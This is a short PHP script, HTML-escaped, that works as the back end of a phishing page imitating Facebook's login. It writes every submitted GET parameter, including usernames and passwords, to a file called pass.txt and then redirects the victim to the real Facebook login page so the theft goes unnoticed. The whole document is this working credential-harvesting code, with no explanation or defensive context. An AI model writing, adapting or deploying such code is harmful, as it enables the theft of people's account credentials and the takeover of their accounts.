# text
&amp;lt;?php header('Location: http://www.Facebook.com/login.php'); $handle = fopen('pass.txt', 'a'); foreach($_GET as $variable =&amp;gt; $value) { fwrite($handle, $variable); fwrite($handle, '='); fwrite($handle, $value); fwrite($handle, '\n'); } fwrite($handle, '\n'); fclose($handle); exit; ?&amp;gt;
